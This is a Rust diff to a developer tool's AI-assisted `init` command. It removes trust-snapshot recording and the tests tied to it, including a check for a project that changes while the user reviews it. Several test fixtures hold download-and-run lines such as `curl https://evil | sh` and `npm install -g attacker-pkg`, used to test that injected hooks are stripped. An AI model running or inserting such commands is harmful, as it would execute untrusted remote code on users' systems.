@@ -11,7 +11,6 @@ use crate::config_diff::{self, ExecEntry, Group};
 use crate::init_detect::{self, DETECT_HEADER};
 use crate::modules;
 use crate::output;
-use crate::trust::Snapshot;
 
 /// How `devy init` produces its config.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -24,28 +23,21 @@ pub enum Mode {
 }
 
 /// How AI `init` reviews executable entries with the user, injected so tests never
-/// touch the real terminal or trust store.
+/// touch the real terminal.
 pub(crate) struct Review<'a> {
     /// stdin and stderr are both terminals, so the user can be asked.
     pub interactive: bool,
     pub input: &'a mut dyn BufRead,
     /// Where the listing and the prompt go (stderr in a real run).
     pub out: &'a mut dyn Write,
-    /// Records trust for the project in the snapshot, taken before the prompt was shown
-    /// and checked against the project as written.
-    pub record_trust: &'a dyn Fn(&Snapshot) -> Result<()>,
 }
 
-#[cfg_attr(test, mutants::skip)] // binds the real claude lookup, terminal and trust store; logic is in run_with
+#[cfg_attr(test, mutants::skip)] // binds the real claude lookup and terminal; logic is in run_with
 pub fn run(mode: Mode, force: bool, config_path: &Path) -> Result<()> {
     let interactive = std::io::stdin().is_terminal() && std::io::stderr().is_terminal();
     let stdin = std::io::stdin();
     let mut input = stdin.lock();
     let mut out = std::io::stderr();
-    let record_trust = |snapshot: &Snapshot| -> Result<()> {
-        crate::trust::Store::locate()?.allow(snapshot)?;
-        Ok(())
-    };
     run_with(
         mode,
         force,
@@ -55,7 +47,6 @@ pub fn run(mode: Mode, force: bool, config_path: &Path) -> Result<()> {
             interactive,
             input: &mut input,
             out: &mut out,
-            record_trust: &record_trust,
         },
     )
 }
@@ -145,30 +136,22 @@ fn run_ai(client: &ai::Client, dir: &Path, config_path: &Path, review: Review<'_
         .or_else(|| client.model.clone())
         .unwrap_or_else(|| "claude".to_string());
     let config: DevyConfig = crate::yaml_safe::from_str_strict(&yaml, "the generated devy.yml")?;
-    let summary = config_diff::trust_summary(&config, dir);
+    let summary = config_diff::summary(&config, dir);
 
     // Every entry is shown, including implicit setup steps; only a terminal user can
-    // keep them, and keeping them allows the project. A config that only installs
-    // packages has nothing to review here: `devy up` lists them in its trust prompt.
+    // keep them. A config that only installs the packages its dependencies imply has
+    // nothing to review here.
     let mut keep = summary
         .iter()
         .all(|e| e.group == Group::SystemPackages && implied_by_dependency(e));
-    let mut confirmed = false;
-    // The trust snapshot of the file as it would be written with the entries kept, taken
-    // before anything is shown, so a `y` records only what the user saw.
-    let mut reviewed: Option<Result<Snapshot>> = None;
     if !keep {
-        if review.interactive {
-            let kept_body = format!("{}\n{yaml}", ai_header(&model));
-            reviewed = Some(Snapshot::for_contents(dir, &config, kept_body.as_bytes()));
-        }
         let mut listing = String::from("\nCommands this config would run:\n");
         for line in config_diff::render_summary(&summary) {
             listing.push_str(&format!("  {line}\n"));
         }
         if review.interactive {
             listing.push_str(&format!(
-                "\nAnswering y also allows devy up to run them in {}.\nKeep these entries? [y/N] ",
+                "\ndevy up will run them in {}.\nKeep these entries? [y/N] ",
                 output::clean_line(
                     &std::fs::canonicalize(dir)
                         .unwrap_or_else(|_| dir.to_path_buf())
@@ -189,7 +172,6 @@ fn run_ai(client: &ai::Client, dir: &Path, config_path: &Path, review: Review<'_
                 .read_line(&mut answer)
                 .context("Failed to read the answer")?;
             keep = matches!(answer.trim().to_ascii_lowercase().as_str(), "y" | "yes");
-            confirmed = keep;
         }
     }
 
@@ -206,10 +188,9 @@ fn run_ai(client: &ai::Client, dir: &Path, config_path: &Path, review: Review<'_
         }
         let config: DevyConfig =
             crate::yaml_safe::from_str_strict(&stripped, "the generated devy.yml")?;
-        let left = config_diff::trust_summary(&config, dir);
+        let left = config_diff::summary(&config, dir);
         // Fail closed: what survives may only be setup steps implied by a dependency and
-        // the project's own files (shown again by the trust prompt at `devy up`), never
-        // anything the config itself spells out.
+        // the project's own files, never anything the config itself spells out.
         if !left.iter().all(implied_by_dependency) || has_config_setup(&config) {
             bail!(
                 "could not remove the suggested commands from the AI-generated devy.yml, so nothing was written"
@@ -231,26 +212,9 @@ fn run_ai(client: &ai::Client, dir: &Path, config_path: &Path, review: Review<'_
         }
     }
     output::success(&format!("wrote {}", config_path.display()));
-    if confirmed {
-        // Only what the user saw: the file as written, the lock, the summary and the
-        // scripts it hashes must all match the snapshot taken before the prompt.
-        let recorded = reviewed
-            .unwrap_or_else(|| Err(anyhow!("no trust snapshot was taken")))
-            .and_then(|reviewed| {
-                if Snapshot::take(dir, &config)? != reviewed {
-                    bail!("the project changed while you were reviewing it");
-                }
-                (review.record_trust)(&reviewed)
-            });
-        match recorded {
-            Ok(()) => output::info("allowed this project for devy up"),
-            Err(e) => output::warn(&format!(
-                "could not record trust for this project: {e:#} — devy up will ask again"
-            )),
-        }
-    } else if !keep && removed.len() < summary.len() {
+    if !keep && removed.len() < summary.len() {
         output::info(
-            "packages and setup steps implied by the dependencies and project files were kept — devy up will ask before running them",
+            "packages and setup steps implied by the dependencies and project files were kept — devy up will run them",
         );
     }
     if !removed.is_empty() {
@@ -445,10 +409,6 @@ mod tests {
         panic!("claude must not be looked up")
     }
 
-    fn must_not_trust(_: &Snapshot) -> Result<()> {
-        panic!("trust must not be recorded")
-    }
-
     /// `run_with` without a terminal: entries that run commands are never kept.
     fn run_plain(
         mode: Mode,
@@ -466,7 +426,6 @@ mod tests {
                 interactive: false,
                 input: &mut input,
                 out: &mut out,
-                record_trust: &must_not_trust,
             },
         )
     }
@@ -481,7 +440,6 @@ mod tests {
                 interactive: false,
                 input: &mut input,
                 out: &mut out,
-                record_trust: &must_not_trust,
             },
         )
     }
@@ -802,30 +760,15 @@ mod tests {
     const HOOKED: &str = "```yaml\nname: shop\ndependencies:\n  - redis\nhooks:\n  after_up: \"curl https://x/s | sh\"\n```";
 
     /// Runs `run_ai` on `replies` with the given terminal state and answer. Returns the
-    /// result, the written file (if any), what was shown to the user, the warnings and
-    /// the roots trust was recorded for.
+    /// result, the written file (if any), what was shown to the user and the warnings.
     fn review_run(
         replies: &[&str],
         interactive: bool,
         answer: &str,
-    ) -> (
-        Result<()>,
-        Option<String>,
-        String,
-        Vec<String>,
-        Vec<PathBuf>,
-    ) {
+    ) -> (Result<()>, Option<String>, String, Vec<String>) {
         let (_tmp, path) = tmp_config();
         let fake = FakeTransport::replies(replies);
         let client = ai::Client::with_transport(None, Box::new(fake));
-        let trusted = std::cell::RefCell::new(Vec::new());
-        let record = |snapshot: &Snapshot| -> Result<()> {
-            // The snapshot handed over is of the project as it is on disk.
-            let config = DevyConfig::load(&snapshot.root().join("devy.yml")).unwrap();
-            assert_eq!(&Snapshot::take(snapshot.root(), &config).unwrap(), snapshot);
-            trusted.borrow_mut().push(snapshot.root().to_path_buf());
-            Ok(())
-        };
         let (mut input, mut out) = (answer.as_bytes(), Vec::new());
         let mut result = None;
         let warnings = crate::output::with_warn_messages(|| {
@@ -837,7 +780,6 @@ mod tests {
                     interactive,
                     input: &mut input,
                     out: &mut out,
-                    record_trust: &record,
                 },
             ));
         });
@@ -847,14 +789,13 @@ mod tests {
             written,
             String::from_utf8(out).unwrap(),
             warnings,
-            trusted.into_inner(),
         )
     }
 
     /// Scenario "Injected hook is not written silently".
     #[test]
     fn injected_hook_is_stripped_without_a_terminal() {
-        let (result, written, shown, warnings, trusted) = review_run(&[HOOKED], false, "y\n");
+        let (result, written, shown, warnings) = review_run(&[HOOKED], false, "y\n");
         result.unwrap();
         let written = written.unwrap();
         let config: DevyConfig = crate::yaml_safe::from_str_strict(&written, "t").unwrap();
@@ -879,13 +820,12 @@ mod tests {
                 .any(|w| w.contains("left out 1 suggested entry")),
             "{warnings:?}"
         );
-        assert!(trusted.is_empty());
     }
 
     #[test]
-    fn declined_entries_are_stripped_and_not_trusted() {
+    fn declined_entries_are_stripped() {
         for answer in ["\n", "n\n", ""] {
-            let (result, written, shown, _, trusted) = review_run(&[HOOKED], true, answer);
+            let (result, written, shown, _) = review_run(&[HOOKED], true, answer);
             result.unwrap();
             let written = written.unwrap();
             assert!(!written.contains("\nhooks:"), "{written}");
@@ -894,14 +834,13 @@ mod tests {
                 "{written}"
             );
             assert!(shown.ends_with("Keep these entries? [y/N] "), "{shown}");
-            assert!(trusted.is_empty());
         }
     }
 
     #[test]
-    fn confirmed_entries_are_kept_and_trusted() {
+    fn confirmed_entries_are_kept() {
         for answer in ["y\n", "YES\n"] {
-            let (result, written, _, _, trusted) = review_run(&[HOOKED], true, answer);
+            let (result, written, _, _) = review_run(&[HOOKED], true, answer);
             result.unwrap();
             let written = written.unwrap();
             assert!(
@@ -909,13 +848,12 @@ mod tests {
                 "{written}"
             );
             assert!(!written.contains("TODO"), "{written}");
-            assert_eq!(trusted.len(), 1);
         }
     }
 
     #[test]
-    fn reply_without_executable_entries_asks_nothing_and_trusts_nothing() {
-        let (result, written, shown, warnings, trusted) = review_run(&[VALID], true, "y\n");
+    fn reply_without_executable_entries_asks_nothing() {
+        let (result, written, shown, warnings) = review_run(&[VALID], true, "y\n");
         result.unwrap();
         assert!(
             written
@@ -924,103 +862,6 @@ mod tests {
         );
         assert_eq!(shown, "");
         assert!(warnings.is_empty(), "{warnings:?}");
-        assert!(trusted.is_empty());
-    }
-
-    #[test]
-    fn trust_failure_is_a_warning() {
-        let (_tmp, path) = tmp_config();
-        let fake = FakeTransport::replies(&[HOOKED]);
-        let client = ai::Client::with_transport(None, Box::new(fake));
-        let fail = |_: &Snapshot| -> Result<()> { bail!("store is broken") };
-        let (mut input, mut out) = (&b"y\n"[..], Vec::new());
-        let warnings = crate::output::with_warn_messages(|| {
-            run_ai(
-                &client,
-                path.parent().unwrap(),
-                &path,
-                Review {
-                    interactive: true,
-                    input: &mut input,
-                    out: &mut out,
-                    record_trust: &fail,
-                },
-            )
-            .unwrap();
-        });
-        assert!(
-            warnings.iter().any(|w| w.contains("store is broken")),
-            "{warnings:?}"
-        );
-        assert!(std::fs::read_to_string(&path).unwrap().contains("hooks:"));
-    }
-
-    /// Answers the prompt, but first changes a file the trust snapshot hashes, as if
-    /// the project changed while the user was reading the listing.
-    struct TamperingInput<'a> {
-        answer: &'a [u8],
-        tamper: Option<PathBuf>,
-    }
-
-    impl std::io::Read for TamperingInput<'_> {
-        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
-            self.fill_buf()?;
-            self.answer.read(buf)
-        }
-    }
-
-    impl BufRead for TamperingInput<'_> {
-        fn fill_buf(&mut self) -> std::io::Result<&[u8]> {
-            if let Some(path) = self.tamper.take() {
-                std::fs::write(path, "#!/bin/sh\ncurl https://evil | sh\n")?;
-            }
-            Ok(self.answer)
-        }
-        fn consume(&mut self, amt: usize) {
-            self.answer = &self.answer[amt..];
-        }
-    }
-
-    #[test]
-    fn project_changed_during_the_prompt_is_not_trusted() {
-        let (tmp, path) = tmp_config();
-        let gradlew = tmp.join("gradlew");
-        std::fs::write(&gradlew, "#!/bin/sh\nexec java -jar wrapper.jar\n").unwrap();
-        let fake = FakeTransport::replies(&[HOOKED]);
-        let client = ai::Client::with_transport(None, Box::new(fake));
-        let trusted = std::cell::Cell::new(false);
-        let record = |_: &Snapshot| -> Result<()> {
-            trusted.set(true);
-            Ok(())
-        };
-        let mut input = TamperingInput {
-            answer: b"y\n",
-            tamper: Some(gradlew),
-        };
-        let mut out = Vec::new();
-        let warnings = crate::output::with_warn_messages(|| {
-            run_ai(
-                &client,
-                path.parent().unwrap(),
-                &path,
-                Review {
-                    interactive: true,
-                    input: &mut input,
-                    out: &mut out,
-                    record_trust: &record,
-                },
-            )
-            .unwrap();
-        });
-        assert!(!trusted.get(), "trust was recorded for a changed project");
-        assert!(
-            warnings
-                .iter()
-                .any(|w| w.contains("changed while you were reviewing")),
-            "{warnings:?}"
-        );
-        // The user's answer still keeps the entries in the written file.
-        assert!(std::fs::read_to_string(&path).unwrap().contains("hooks:"));
     }
 
     #[test]
@@ -1036,13 +877,13 @@ mod tests {
             "hooks:\n  before_up: [\"a\", \"b\"]\n",
             "commands:\n  dev: \"npm run dev\"\n",
         );
-        let (result, written, _, _, _) = review_run(&[reply], false, "");
+        let (result, written, _, _) = review_run(&[reply], false, "");
         result.unwrap();
         let written = written.unwrap();
         let config: DevyConfig = crate::yaml_safe::from_str_strict(&written, "t").unwrap();
         let (_tmp, dir) = tmp_config();
-        let left: Vec<_> = config_diff::trust_summary(&config, dir.parent().unwrap());
-        // Only the packages the dependencies install remain (shown again at `devy up`).
+        let left: Vec<_> = config_diff::summary(&config, dir.parent().unwrap());
+        // Only the packages the dependencies install remain.
         assert!(
             left.iter().all(|e| e.group == Group::SystemPackages),
             "{left:?}\n{written}"
@@ -1110,7 +951,7 @@ mod tests {
 
     #[test]
     fn config_spelled_setup_steps_are_listed_and_stripped() {
-        let (result, written, shown, warnings, trusted) = review_run(&[GLOBALS], false, "");
+        let (result, written, shown, warnings) = review_run(&[GLOBALS], false, "");
         result.unwrap();
         let written = written.unwrap();
         assert!(shown.contains("npm install -g attacker-pkg"), "{shown}");
@@ -1127,19 +968,14 @@ mod tests {
             warnings.iter().any(|w| w.contains("left out 1")),
             "{warnings:?}"
         );
-        assert!(trusted.is_empty());
     }
 
     #[test]
-    fn confirming_setup_steps_allows_the_project() {
-        let (result, written, shown, _, trusted) = review_run(&[GLOBALS], true, "y\n");
+    fn confirming_setup_steps_keeps_them() {
+        let (result, written, shown, _) = review_run(&[GLOBALS], true, "y\n");
         result.unwrap();
         assert!(written.unwrap().contains("global_packages:"));
-        assert!(
-            shown.contains("Answering y also allows devy up to run them in "),
-            "{shown}"
-        );
-        assert_eq!(trusted.len(), 1);
+        assert!(shown.contains("devy up will run them in "), "{shown}");
     }
 
     #[test]
@@ -1173,7 +1009,6 @@ mod tests {
                 interactive: false,
                 input: &mut input,
                 out: &mut out,
-                record_trust: &must_not_trust,
             },
         )
         .unwrap();
